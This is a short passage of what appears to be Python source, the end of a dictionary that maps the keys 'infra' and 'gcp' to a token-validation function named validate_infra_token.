    "infra":    validate_infra_token,
    "gcp":      validate_infra_token,
}
